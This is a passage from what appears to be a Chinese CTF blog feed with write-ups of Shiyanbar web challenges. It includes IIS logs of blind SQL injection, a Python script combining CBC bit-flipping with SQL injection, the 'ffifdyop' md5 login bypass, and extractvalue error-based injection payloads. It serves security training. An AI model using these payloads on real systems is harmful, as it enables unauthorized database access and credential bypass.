/show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;50|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;49|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;100|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;98 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;99 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;53 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br></pre></td></tr></table></figure><p>利用二分法一位一位分析，最后得到8位的ascii值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">53</span>)</span><br><span class="line"><span class="string">'5'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">50</span>)</span><br><span class="line"><span class="string">'2'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">99</span>)</span><br><span class="line"><span class="string">'c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">53</span>)</span><br><span class="line"><span class="string">'5'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">102</span>)</span><br><span class="line"><span class="string">'f'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">49</span>)</span><br><span class="line"><span class="string">'1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">100</span>)</span><br><span class="line"><span class="string">'d'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">54</span>)</span><br><span class="line"><span class="string">'6'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>拼接得flag:52c5f1d6</p><h3 id="花式绕waf"><a href="#花式绕waf" class="headerlink" title="花式绕waf"></a>花式绕waf</h3><p>扫描后台得到<a href="http://www.zip文件，获得源代码，考察sql注入" target="_blank" rel="noopener">www.zip文件，获得源代码，考察sql注入</a></p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>实验吧Web</title>
    <link href="https://Foxgrin.github.io//posts/65109/"/>
    <id>https://Foxgrin.github.io//posts/65109/</id>
    <published>2018-09-13T06:34:00.000Z</published>
    <updated>2018-09-17T12:35:12.755Z</updated>
    
    <content type="html"><![CDATA[<p>实验吧Web题解<a id="more"></a></p><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/jiandan/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/jiandan/index.php</a></p><p>burp抓包发现响应包头部tips:test.php</p><p>test.php给出了index.php的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define(&quot;SECRET_KEY&quot;, &apos;***********&apos;); </span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); </span><br><span class="line">error_reporting(0); </span><br><span class="line">include(&apos;conn.php&apos;); </span><br><span class="line">function sqliCheck($str)&#123; </span><br><span class="line">if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123; </span><br><span class="line">return 1; </span><br><span class="line">&#125; </span><br><span class="line">return 0; </span><br><span class="line">&#125; </span><br><span class="line">function get_random_iv()&#123; </span><br><span class="line">$random_iv=&apos;&apos;; </span><br><span class="line">for($i=0;$i&lt;16;$i++)&#123; </span><br><span class="line">$random_iv.=chr(rand(1,255)); </span><br><span class="line">&#125; </span><br><span class="line">return $random_iv; </span><br><span class="line">&#125; </span><br><span class="line">function login($info)&#123; </span><br><span class="line">$iv = get_random_iv(); </span><br><span class="line">$plain = serialize($info); </span><br><span class="line">$cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); </span><br><span class="line">setcookie(&quot;iv&quot;, base64_encode($iv)); </span><br><span class="line">setcookie(&quot;cipher&quot;, base64_encode($cipher)); </span><br><span class="line">&#125; </span><br><span class="line">function show_homepage()&#123; </span><br><span class="line">global $link; </span><br><span class="line">if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; </span><br><span class="line">$cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); </span><br><span class="line">$iv = base64_decode($_COOKIE[&quot;iv&quot;]); </span><br><span class="line">if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; </span><br><span class="line">$info = unserialize($plain) or die(&quot;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&quot;); </span><br><span class="line">$sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;; </span><br><span class="line">$result=mysqli_query($link,$sql); </span><br><span class="line">if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123; </span><br><span class="line">$rows=mysqli_fetch_array($result); </span><br><span class="line">echo &apos;Hello!&apos;.$rows[&apos;username&apos;].&apos;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">echo &apos;Hello!&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">die(&quot;ERROR!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">if(isset($_POST[&apos;id&apos;]))&#123; </span><br><span class="line">$id = (string)$_POST[&apos;id&apos;]; </span><br><span class="line">if(sqliCheck($id)) </span><br><span class="line">die(&quot;sql inject detected!&quot;); </span><br><span class="line">$info = array(&apos;id&apos;=&gt;$id); </span><br><span class="line">login($info); </span><br><span class="line">echo &apos;Hello!&apos;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123; </span><br><span class="line">show_homepage(); </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计代码，首先对我们post的参数id进行了sql语句关键词过滤，其中过滤了union，逗号，#，=，-，like，然后通过过滤后对数组plain进行cbc加密，加密后的值cipher和随机16位字符串iv存储在cookie对应的字段中，最终将cbc解密的id值执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="string">".$info['id']."</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p>可见，不管我们给id赋值1,2,3等，最终经过limit id,0后都得不到查询结果。我们要进行sql注入的话，就必须将后面的0注释掉，但是这里过滤掉了注释符#，–，所以用%00代替注释</p><p>给个payload:1;%00，通过burp先post id=1;%00，再将得到的cookie加入请求头的cookie字段，然后再访问，但是这里可能是php或者mysql修复了%00截断，因为直接输入1;%00依然无法实现截断 </p><p>以下这段话参考别人的文章：</p><p>%00截断并不是字面意义上的截断，而是指%00经过urldecode之后会变成空字符\0，我们知道在c语言中\0是字符串的结尾，所以\0之后的字符就被截断了。所以，在本道题中不能直接输入1;%00，因为这样会被编码成1%3B%2500，需要用burpsuit抓包后修改为1%3B%00，然后再post才能成功截断。 </p><p>试着post id=1%3B%00</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功得到用户名信息</p><p>那么我们继续执行注入，必须用到union，但是这里过滤了union，所以我们通过cbc字节翻转的方式，具体cbc字节翻转攻击原理就不具体说了，可以参考我之前的文章。此外，还过滤了逗号，那么我们可以用连接关键词join</p><p>下面直接给出payloads</p><p>注数据库名的payload:0 Anion select * from ((select 1)a join (select database())b join (select 3)c);%00</p><p>注表名的payload:0 Anion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c);%00</p><p>注列名的payload:0 Anion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name=’you_want’)b join (select 3)c);%00</p><p>注数据的payload:0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);”%00</p><p>下面给出最后注出flag的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/jiandan/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'id'</span>: <span class="string">"0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);"</span>+chr(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">r1 = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(r1.cookies)</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cookies[<span class="string">'cipher'</span>]))</span><br><span class="line">index = <span class="number">7</span></span><br><span class="line">new_cipher = cipher[:index] + chr(ord(cipher[index])^ord(<span class="string">'A'</span>)^ord(<span class="string">'u'</span>)) + cipher[index+<span class="number">1</span>:]</span><br><span class="line">new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">cookies[<span class="string">'cipher'</span>] = new_cipher</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url,cookies=cookies)</span><br><span class="line">plain = base64.b64decode(re.findall(<span class="string">"base64_decode\('(.*)'\)"</span>,r2.text)[<span class="number">0</span>])</span><br><span class="line">iv = base64.b64decode(urllib.unquote(cookies[<span class="string">'iv'</span>]))</span><br><span class="line">target = <span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">new_iv = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">new_iv = new_iv + chr(ord(iv[i])^ord(plain[i])^ord(target[i]))</span><br><span class="line">cookies[<span class="string">'iv'</span>] = urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line"></span><br><span class="line">r3 = requests.get(url,cookies=cookies)</span><br><span class="line">r3.encoding = r3.apparent_encoding</span><br><span class="line"><span class="keyword">print</span> r3.text</span><br></pre></td></tr></table></figure><p>说明一下在python中chr(0)代表空字符的意思，而我们要进行截断都是通过空字符来截断</p><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line">if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">echo &apos;flag is :&apos;.$flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;密码错误!&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对参数password进行了md5加密，看似不能进行sql注入，但是这里md5函数里出现参数true，查询一下md5参数加入了参数true，得到的是原始16位的二进制数</p><p>在本地测试了一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str,<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>二进制数在浏览器上显示时会转化为字符串</p><p>所以我们进行注入的话，就必须要想办法让md5加密后是’or 6的形式</p><p>这里直接拿别人得到的字符串： ffifdyop </p><p><img src="/img/实验吧Web/4.png" alt=""></p><p>可以看到加密后的字符串为’or’6É]™é!r,ùíb</p><p>拼接到sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'".'</span> <span class="keyword">or</span> <span class="string">'6É]™é!r,ùíb."'</span></span><br></pre></td></tr></table></figure><p>语句恒真，始终有查询结果，成功注出flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p><p>源代码提示了需要post参数username和password</p><p>还给出了sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure><p>使用万能密码登录admin用户,username=admin&amp;password=’ or ‘1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录成功，但没有给出flag，说明要进行题目说的报错注入才能得到flag</p><p>尝试在username参数进行报错注入，但发现过了括号，注释符#，–，%3B%00</p><p>但是行注释符没有被过滤，我们可以通过行注释符注释掉中间的’ and password=’进行注入</p><p>得出payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; /*&amp;password=*/ or &apos;</span><br></pre></td></tr></table></figure><p>拼接后相当于执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="comment">/*and password='*/</span> <span class="keyword">or</span> <span class="string">''</span></span><br></pre></td></tr></table></figure><p>在本地数据库演示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么使用在username中使用extract，在password中使用括号，再通过行注释符注释中间，最终拼接成完成的extractvalue注入，就是我们的目的</p><p>先注出数据库</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select database()),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img 